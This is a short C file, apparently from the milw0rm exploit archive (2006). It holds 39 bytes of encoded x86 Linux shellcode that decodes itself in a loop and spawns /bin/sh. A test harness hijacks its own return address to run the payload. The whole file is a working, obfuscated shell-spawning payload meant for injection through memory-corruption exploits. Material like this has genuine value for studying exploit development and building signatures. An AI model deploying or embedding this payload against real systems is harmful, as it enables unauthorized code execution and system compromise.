/*
 * (linux/x86) - execve("/bin/sh", ["/bin/sh"], NULL) / encoded by +1 - 39 bytes
 * - izik <izik@tty64.org>
 */

char shellcode[] =

	"\x68\x8a\xe2\xce\x81"  // push $0x81cee28a
	"\x68\xb1\x0c\x53\x54"  // push $0x54530cb1
	"\x68\x6a\x6f\x8a\xe4"  // push $0xe48a6f6a
	"\x68\x01\x69\x30\x63"  // push $0x63306901
	"\x68\x69\x30\x74\x69"  // push $0x69743069
	"\x6a\x14"              // push $0x14
	"\x59"                  // pop %ecx

	//
	// <_unpack_loop>:
	//

	"\xfe\x0c\x0c"          // decb (%esp,%ecx,1)
	"\x49"                  // dec %ecx
	"\x79\xfa"              // jns <_unpack_loop>
	"\x41"                  // inc %ecx
	"\xf7\xe1"              // mul %ecx
	"\x54"                  // push %esp
	"\xc3";                 // ret

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int) shellcode;
}

// milw0rm.com [2006-01-25]